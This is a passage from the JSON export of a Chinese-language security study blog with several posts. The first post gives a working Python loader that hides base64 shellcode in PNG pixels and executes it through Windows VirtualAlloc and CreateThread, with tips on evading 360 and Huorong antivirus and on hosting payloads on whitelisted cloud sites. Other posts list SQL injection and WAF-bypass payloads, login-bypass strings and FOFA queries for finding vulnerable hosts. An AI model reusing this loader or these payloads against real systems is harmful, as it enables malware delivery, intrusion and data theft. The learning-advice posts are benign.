encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\ndef RGBencodeDataInImage(image, data):\n    evenImage &#x3D; RGBmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary)%3 !&#x3D; 0:  # 将转换的比特流数据末位补零，使其长度为3的倍数，防止其在下面重新编码的过程中发生越界\n        rema &#x3D; len(binary)%3\n        binary &#x3D; binary+(&#39;0&#39;*(3-rema))\n#        print(len(binary))\n    if len(binary) &gt; len(image.getdata()) * 3:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 3 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*3+0]),g+int(binary[index*3+1]),b+int(binary[index*3+2])) if index*3 &lt; len(binary) else (r,g,b) for index, (r,g,b) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    arguments &#x3D; docopt(__doc__)\n#    print(arguments)\n\n    if arguments[&#39;-e&#39;] or arguments[&#39;encode&#39;]:\n        if arguments[&#39;&lt;text&gt;&#39;] is None:\n            arguments[&#39;&lt;text&gt;&#39;] &#x3D; &quot;待加密的文本&quot;\n        if arguments[&#39;&lt;encodedImage&gt;&#39;] is None:\n            arguments[&#39;&lt;encodedImage&gt;&#39;] &#x3D; &quot;encodedImage.png&quot;\n\n        if isTextFile(arguments[&#39;&lt;text&gt;&#39;]):\n            with open(arguments[&#39;&lt;text&gt;&#39;], &#39;rt&#39;) as f:\n                arguments[&#39;&lt;text&gt;&#39;] &#x3D; f.read()\n\n        print(&quot;载体图片:&quot;)\n        print(arguments[&#39;&lt;originImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;待加密密文:&quot;)\n        print(arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密后图片:&quot;)\n        print(arguments[&#39;&lt;encodedImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;originImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            RGBAencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     RGBencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        else:\n            print(&quot;暂不支持此图片格式……&quot;)\n\n        print(&quot;加密完成,密文为：\\n&quot;+arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n    elif arguments[&#39;-d&#39;] or arguments[&#39;decode&#39;]:\n        print(&quot;解密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     print(&quot;解秘完成，密文为：\\n&quot;+RGBdecodeImage(im)+&quot;\\n&quot;)\n        else:\n            print(&quot;非法的图片格式……&quot;)\n\n使用：xx.py -e 被写入图片.PNG  写入内容\n解密执行python文件\n#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\nimport base64,ctypes\n\n\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\n\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    #arguments &#x3D; docopt(__doc__)\n    im &#x3D; Image.open(&#39;encodedImage.png&#39;)\n    print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n    func&#x3D;base64.b64decode(RGBAdecodeImage(im))\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(func), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(func), len(func))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\n加密完成会自动生成加密图片文件，解密加载脚本运行会自动获取文件夹内的加密图片文件，直接运行解密脚本上线\n坑点：上面的文本提取有一个坑点，就是需要使用exec执行函数，这样360是过不了的\n其中使用http远程加载，火绒是完全不会报毒，正常上线\n使用py2exe打包socket之后，运行程序360不会报毒，但是客户端发送加密shellcode就会直接被杀\n其他则是直接被杀，360果然还是挺强的\n其他思路就是用不同方式请求获取shellcode\n如：获取app数据，获取oss页面数据，获取cdn数据，还有就是利用白名单，将shellcode放到一些可能是白名单的网站上像阿里云，百度等等的大公司的业务上面，只要能获取就行。\n入门学习笔记，想通过审核进论坛看文章，别喷我！！！\n","slug":"python免杀-小迪笔记","date":"2022-08-17T09:26:05.000Z","categories_index":"python","tags_index":"免杀","author_index":"Longw"},{"id":"96816457e24e5ee2d74dc29d18ce444d","title":"SQL注入2","content":"\n\n补补基础，理解注入，记下学习笔记\nSQL注入数字型无需闭合单引号\n字符型闭合语句进行注入\n注入测试流程判断注入点注入类型获取信息函数user() database() version()  @@hostname   @@datadir  @@version_compile_os\nschema() connection_id() system_user()\tsession_user()\tcurrent_user() current_user\nsuser_name() user_name() db_name() is_member(&#39;db_owner&#39;) #判断数据库角色 \nconvert(int,&#39;5&#39;) #类型转换 stuff Getdata \n\n有回显\n报错注入：\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1)\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e))\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\n?id&#x3D;1&#39; and exp(~(select * from (select user())a))   #必须按照这个模式来，mysql是大于709\n\n利用报错注入获取信息时，信息条数最好限定，limit 0,1\nunion注入：\norder by判断字段数\nuinon select 1,2,3...     #找回显点\nunion select 1,user(),3...   #利用回显点\n\nunion注入，需要前面的语句错误，前后字段相同，默认去掉重复，union all不去除重复\n\n无回显\n布尔盲注\n利用true和false判断\nand (left(database(),1)&#x3D;&#39;s&#39;)   #判断数据库名的第一个字符\n\nand (ascii(substr(database(),1,1))&#x3D;97)  #用ascii判断\n\nand (length(database())&#x3D;5)   #利用length判断\n\n一般来说使用&gt;  &lt; 来判断范围，之后再判断具体数据\n延时注入\nselect benchark(1000,select * from user)   #mysql&lt;5.0,执行1000查询语句，尤其注意可能会导致数据库崩溃\n\nand sleep(5)   #直接测试能否执行\n\nand if(length(database())&gt;4,sleep(5),0)   #database&gt;4,则睡眠五秒\n\nand if(substring(user(),1,4)&#x3D;&#39;root&#39;,sleep(5),1)  #判断当前用户\n   \nand if(MID(version(),1,1)like 5,sleep(5),1)   #判断数据库版本\n\nand if(ascii(substring(database(),1,4))&gt;97,sleep(5),1)   #判断数据库名\n\n上面加了一些函数的用法，以达到获取信息\n\n二次注入二次注入的使用是将语句带入数据库，在另外一个地方查询数据库信息时，执行该语句，返回执行结果\n比如：\n在注册用户时，将用户名设置为 aaa&#39; order by 7%23\n在另外查询用户数据的地方，存在带入查询，就会执行该语句\n之后不断修改用户名，再不断查询用户名返回结果，达到注入目的\n\n宽字节注入在数据库使用GBK、GB18030、BIG5等编码时，可能存在宽字节注入\n在注入点使用了addslashes()等转义单引号，如：\n?id&#x3D;1&#39;   返回 id&#x3D;1\\&#39;\n\\在宽字节中编码为%5c,使用%df，则会将其转化为繁体字，从而绕过了单引号过滤\n?id&#x3D;1%df&#39;   这样进行注入\n\n其他特殊注入cookie注入\n\nxff头注入\n\nxml实体注入\n\n伪静态注入：\n在F12控制台输入：javascript:alert(document.lastModified)\n回车弹框时间，然后等几秒再来一次，查看时间是否和上次的相同，如果相同就证明是静态的，如果时间和上次不同，则是伪静态的网站   #https:&#x2F;&#x2F;blog.csdn.net&#x2F;p_utao&#x2F;article&#x2F;details&#x2F;108654640\n\n等等，大差不差\n\nAccess偏移注入：知道了表名，不知道字段的时候\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\nWAF绕过常用的：\nor–+2&#x3D;!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格\n注释替代 and&#x2F;&#x2F;select&#x2F;&#x2F;uname&#x2F;&#x2F;from&#x2F;&#x2F;users\n+号连接字符替换\n大小写、双写、AND&#x2F;&amp;&amp;,OR&#x2F;||、&#x2F;*!xxx*&#x2F;、&#x2F;**&#x2F;、url编码、base64编码\n\n空格替换：\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\nemoji绕waf\n脏数据绕waf\n畸形协议绕过,该post为上传，burp一键切换\n替换常用的可能被waf屏蔽的函数\n\nCVE-2022-34265   Django  sql注入漏洞复现使用vulhub环境\ndocker-compose up -d   #启动环境\n\ndocker ps    #查看服务端口\n\ndocker-compose down -v  #关闭环境，为啥，第二次使用不用下载直接启动\n\n访问IP:8000\n","slug":"SQL注入2","date":"2022-07-15T12:05:32.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"a208cc555303d3d7e79b97f2e2214046","title":"Hack如何学习","content":"InsiderPhD的HACK如何学习笔记关于各种人员学习hack​            找漏洞不要想着只学ctf，这就是学习用的，很难转化为实战。比如说找个xss，你用ctf的payload很难在现实找到，因为大多数厂家都会防御这种攻击。\n​           从ctf转化为实战从来不是一件简单的事情。\n​           你应该学习理论，实战和ctf互相转化。以巩固学习经验。\n​           你应该尝试hack，不管你会或者是不会，你都可以去尝试，这是一个非常好的开始。\n​           同样，学习hack，请开始学习一门编程语言，她推荐她喜欢的php，因为php真的很简单。当你学习php并且完成一个项目后，你可以尝试攻击这个项目。你在学习php做项目的时候，会学习如何防止sql注入，如何过滤xss。当你尝试hack你的项目，并且成功后，你就能将他们结合起来。互相提升。然后你可以尝试学习ctf。这样能让你知道别人在这方面的思路。之后，你可以不断阅读和不断尝试hack。并且推荐你不断进行这两步。\n​          如果还在学校，学习学校提供的便宜的安全课程。还有参加当地的hack聚会，参与学校hack俱乐部等等。\n​          如果你是一位有技术的人，你可以尝试真实的hack一个目标，这样能让你沉浸在真实的hack过程中，而不是不断地学习各种知识。\n​          如果你实在没有时间，你可以参与在线社区之类的。\n​          如果你是一名开发人员，拥有编程经验，十分推荐你从owasp top 10开始学习。然后阅读一些关于你学习的语言方面的文章。比如，你是php开发者，你可以尝试一些包含漏洞。这能让你从理论转化为实战，特别是当你已经拥有防御漏洞的知识。之后，你在阅读常用书籍的时候可以尝试ctf练习，因为你拥有开发经验你更容易理解他们是如何构建的。\n​          如果你在安全方面已经拥有了很多知识，但是你更擅长防御。那么你可以尝试阅读攻击者在某一方面的攻击文章。他们一般擅长攻击而不是如何安全防御。\n​         如果你是一名工程师之类的人员，你更加擅长硬件方面的知识，对于软件了解较少。你可以从初学者学起，可以在学习过程中跳过你已经会的内容。这样可以快速填补你的空白方面，之后你可以尝试真实攻击目标。\n​        最想推荐的就是，你要尝试真实攻击目标，因为这是你学习的目标。建议尽快到达这一步。还有，永远不要停止学习。尽管你可能成功，拥有一个或者多个bug。当你拥有这些后，你可能会感到无聊，甚至感觉自己还是一个初学者，这时候你就要尝试加入一些社区。社区在学习方面很不错，特别是当你还是一个初学者。可以尝试借鉴他人hack的经验。并且与比你技术更好的人交朋友。这样可以拓展业务，也可以帮助你发展你的整体技能。之后，你就可以尝试分享你的知识，帮助和以前的你一样的初学者。\n​        最推荐的资源就是hack会议。不管你对这方面是什么意见。你要像学习科学论文知识一样思考他们为何这样做。这样学习他人的想法能帮助你拓展思维。你拥有你自己独特的眼光来看待世界，同样你拥有自己独特的方法去hack。\n​       ctf入门社区：https://ctf.hacker101.com/\n​       入门靶场：http://www.dvwa.co.uk/\n​       OWASP：https://owasp.org/www-project-juice-shop/\n​       完整的渗透测试学习：https://www.youtube.com/watch?v=WnN6dbos5u8&amp;t=0s  （有相关作业，学完就是完整的初级）\n","slug":"Hack如何学习","date":"2022-04-04T15:04:49.000Z","categories_index":"","tags_index":"hack学习","author_index":"Longw"},{"id":"bc7db7781838613256ae7ac419cf7231","title":"渗透测试工作流程:checklist","content":"\n\n由来最近看p牛直播讲他学习安全的路程和经验（p牛大家都应该认识）。其中也讲到了渗透测试的经验，他说不好弄是很正常的，手忙脚乱也是很正常的。因为我们没有将渗透测试流程化，表单化。我们在现场时，也许不能完整的进行测试。往往在扫描工具没找到重要漏洞、手测一般漏洞也没有找到问题时就找不到方向了。\n所以，将渗透测试流程化，表单化。方便我们在一时没找到头绪是也能将流程做下去，不至于发呆😐懵逼。\n实习了应该两个月了。从一开始的什么都不清楚，到现在有了一点经验。反正就是及时总结吧！\n常见渗透测试漏洞现在总结一下我在进行渗透测试时遇到最多的漏洞。\n\n弱口令\n明文传输\n越权\n反射xss\n\n这些就是我在两个月实习过程的成果，这么一点点问题。\nchecklist（我现在还是菜鸟，流程还不是总结很好，后面会一直更新的）感谢组里老大Rain提供的流程黑盒测试漏洞扫描遇事不决，先扫一波1. 对于网站使用awvs或是appscan，我习惯awvs，还有Netsparker。最好都来一发看看。\n2. 对于主机，使用Nessus，配合插件。\n3. 还有使用goby，好处就是各种插件，就方便了。\n4. 最近出了个qingscan的集成扫描器。可以去GitHub上找到，最好安装到服务器里面，到时候就能让团队成员一起使用了。\n\n 先挂在那边扫着，等等看成果。\n结果验证这个不用讲了，就是将漏洞扫描的结果去验证一下。运气好直接能getshell了。\n经验漏洞这个就看你经验了，就是你以前遇到过或者你知道有这个漏洞。那不就直接验证先吗？像常见oa系统漏洞，常见越权漏洞等等。\n还有就是多多复现漏洞，多多将各种常见的poc在靶场和实战利用利用。\n信息收集直接给后台也要信息收集，对于公布在网络上的系统可以进行正常流程信息收集。对于内网，专网那就找接口信息泄露，推荐一个插件FindSomething。\n找各种js的泄露接口，发包查看返回内容。\n这个可以等后面的测完在慢慢找。\n信息收集的完整流程可以看看这篇，写的比我全：https://blog.zjun.info/2022/web-penetration-information-collection-checklist.html#\n扫描路径\ndirsearch \n\ndirmap\n可能会找到一点惊喜，最好是找到一些敏感路径就在那个路径下再次扫描一波，这样更加全面。\n\n御剑后台扫描\n\n\n抓包分析明文传输单位一般给后台，直接测试一下就行了。\n弱口令后台测试，开始先自己手测一下，看看效果和能不能爆破。\n能爆破就burp抓包爆破。\n测试账号未删除网站编写测试时用到的账号，一般为13333333333这种的。\n短信轰炸还有登录页面是短信登录就可以测试短信轰炸\n还有一个小点，有的单位甚至短信验证码直接都不改的。来两次看看，要是不变这不就可以爆破账号了。\n登录页面Xss这个就不用讲了，看见框就插一波。登录页面抓包后，看提交的参数，每个参数都给他插一遍。\n怕麻烦就用工具，或者是将常用的测试Xss总结起来，用burp直接爆。\n登陆页面sql注入常见的，在账号框内输入\nadmin&#39; or 1&#x3D;1#\nadmin&#39; or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 #\n\n这个可以总结一下各种闭合绕过形成字典，直接burp设置payload爆破测试。\n登录绕过比如修改登录返回包参数，在客户端这边直接登录后台。\n任意注册应该是有些不对外开放的平台，能随意注册导致泄露平台中的一些敏感信息之类的问题。\n框架/组件/插件漏洞常见的\njeecgboot未授权\n\ndruid后台\n\nspring boot\n\nswagger接口未授权\n等等\n\n\n越权测试所有查询点越权观察查询点是否使用token，尝试逆向\n所有操作点越权管理账号cookie和普通账号cookie测试\n正常漏洞测试sql注入payload看以前的sql注入总结\n[]: https://longwblog.com/post/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93\nsqlmap使用\nXss看见框就插试试看，留言、评论都可以试试\n当然，要在授权允许的情况下进行。\n也是有工具测试的\n文件上传就上传绕过测试\n命令执行得找到命令执行的功能点，在测试\nCSRF一般与xss结合，诱人点击执行。\nXXE等队友补充\nSSRF服务端请求伪造等队友补充\n文件包含这个真的不常见\n逻辑漏洞像订单金额修改，简单验证码之类的。一般使用弱伪随机数。\n其实上面的真要测试也是挺复杂的，每个地方的测试的话肯定要花一定的时间。但是因为常见，又是入门学习的漏洞所以简单写一下。\n当然，在信息收集过程若是遇到系统版本号之类的，可以去查一下对应版本的已知漏洞及对应的poc。","slug":"渗透测试工作流程-checklist","date":"2022-01-17T02:26:04.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"dbfc96a8c057ede6b7efcb26a6039a2e","title":"利用网络空间测绘挖洞","content":"\n\n网络测绘空间信息安全发展到现在，各种辅助工具不断地跟新换代。其中对我们最重要的除了burp那几样之外，就是这个网络测绘空间了。他的定义直接百度就行了，这次学习的是如何使用他为我们在进行渗透测试和漏洞挖掘。\n在如今年代，他在渗透测试和漏洞挖掘方面甚至比Google等搜索引擎更加强大。他有固定的语法能让我们直接找到安装对应应用的系统主机。方便我们在找到0day去批量找对应系统或是验证某些刚刚公布的漏洞。\n常用的网络测绘空间国内以前最著名的就是fofa了，不得不说以前在国内绝对可以算是最强。但是最近新出了一个360的网络测绘空间。在实战找漏洞方面，我亲测比fofa好用一点。\n原因有很多，最主要有一个fofa需要会员。这个其实也不算大问题。但是嘛！同样的语法360搜索的内容是fofa的好几倍。这样我们的测试面就广了，找到有漏洞系统的机会也就多了。\nfofa：https://fofa.so\n360：https://quake.360.cn\n钟馗之眼：https://www.zoomeye.org\n这几家就是国内常见的网络测绘空间。\nfofa语句（来自csdn：NoOne_52）Apache Flink未授权访问+远程代码命令执行\n\napp&#x3D;&quot;APACHE-Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\nApache-Shiro\n\n\napp&#x3D;&quot;Apache-Shiro&quot;\n\n\n威胁情报-挖矿啥的\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n目录遍历\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n回手掏之目录遍历\nbody&#x3D;&quot;Directory listing for&quot;||title&#x3D;&quot;index of &#x2F;&quot;||body&#x3D;&quot;转到父目录&quot;\n\nxxl-job-admin漏洞系列，如很早的弱口令和后台计划弹shll\n(body&#x3D;&quot;xxl-job-admin&quot;||body&#x3D;&quot;&lt;a&gt;&lt;b&gt;XXL&lt;&#x2F;b&gt;JOB&lt;&#x2F;a&gt;&quot;)&amp;&amp;body&#x3D;&quot;任务调度中心&quot;\n\n\nAdobe ColdFusion跨站脚本漏洞\napp&#x3D;&quot;Adobe-ColdFusion&quot;\n\nApache Solr远程代码执行漏洞\napp&#x3D;&quot;Solr&quot;\n\nCVE-2019-17558 Apache Solr Velocity模板远程代码执行\nheader&#x3D;“rememberme&#x3D;deleteMe”、header&#x3D;“shiroCookie”\n\nWeblogic\n(app&#x3D;&quot;BEA-WebLogic-Server&quot; || app&#x3D;&quot;Weblogic_interface_7001&quot;) &amp;&amp; country&#x3D;&quot;CN&quot;\n\n深信服VPN远程代码执行（2019 攻防演练）\nheader&#x3D;&quot;Set-Cookie: TWFID&#x3D;&quot;\n\ntitle&#x3D;&quot;Whoops!&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\n\ntitle&#x3D;”abc”  \nheader&#x3D;”abc” \nbody&#x3D;”abc” \ndomain&#x3D;”xx.com” \nhost&#x3D;”.xx.cn” \nport&#x3D;”443”    \nip&#x3D;”1.1.1.1” \nprotocol&#x3D;”https” \ncity&#x3D;”Beijing” \nregion&#x3D;”Zhejiang” \ncountry&#x3D;”CN” \ncert&#x3D;”xx.com” \nip&#x3D;&quot;111.1.1.1&#x2F;8&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;16&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;24&quot;\n\nports&#x3D;&quot;3306,443,22&quot;  搜索同时开启3306端口、443端口和22端口的IP\nports&#x3D;&#x3D;&quot;3306,443,22&quot;  搜索只开启3306端口、443端口和22端口的IP\n\n原文链接：https://blog.csdn.net/weixin_45682070/article/details/109546750\n这些语句应该都是通用的，这样在几家同时找一下。看看搜索结果对比一下就知道谁的搜集范围更加普遍。\n验证当然，再找到对应版本的资产后。我们也要知道对应的poc，这样方便我们进行利用。以前在网上有公布的免费poc库，但是现在给关闭了。所以就需要你们发挥自己的大脑去网上找了。当然，最好是自建一个poc网站。自用能找到就行，但是如果是团队，还是建个内部poc库方便一点。毕竟这样方便及时更新poc库，人多总是力量大的。\n","slug":"利用网络空间测绘挖洞","date":"2022-01-13T11:07:43.000Z","categories_index":"安全漏洞基础","tags_index":"实战","author_index":"Longw"},{"id":"6ba198a2b679996222b6a9277b704dc9","title":"实习小结","content":"\n\n实习都一个半月了，小结一下吧！\n真的就像b站那位红队大佬讲的那样，学的也不算太少但是还是什么都干不了。可是学会了和没学会是不同的概念，即便学会之后忘了。\n半个月时间，渗透测试方面也看了许多文章，学了很多的技巧。在fofa上找对应的网站测试也是行的。但是吧，我实习是干等保的。只能对给的网站下手，以为能秒天秒地秒空气的随便日进内网。结果却发现你除了用工具扫描之后复现一下，查一查接口有没有未授权基本上什么都干不了。\n\n菜的扣脚啊！还好最近发现了那位up主。听他传授经验才发现大家都是一样的。\n还是得找准方向。虽然最近没学习代码语言方面的知识。但是一直在学习等级保护测评师的教材，也算是对这份工作有了深入的了解了。毕竟这是实习考核啊！过不了得滚蛋！！！先把这个努力学好，再对其他方面的努力学习吧。\n最近的学习有了框架，感觉对测评方面打下了不错的基础。学东西也渐渐快了起来，也可以对新人说说要理解着学习了！\n知道了自己的水平，找准自己感兴趣的方向，然后努力往那个方向前进。\n后面除了测评内容，还需要学习php和java代码审计，然后是对脚本编写方面深入学习一下。还有平时要不断学习各种常见的漏洞，学会他们的打法。最后就是多多总结关键点，形成自己的风格。\n\n","slug":"实习小结","date":"2022-01-09T04:46:21.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"31f05bcb8807c536b785c3c2b7399b78","title":"java版本切换","content":"\n\nJDK版本切换我们在进行渗透测试时会用到许许多多的工具，一般的工具需要Java8而有的工具如最新版burp则需要Java11版本。这时候就需要进行JDK的版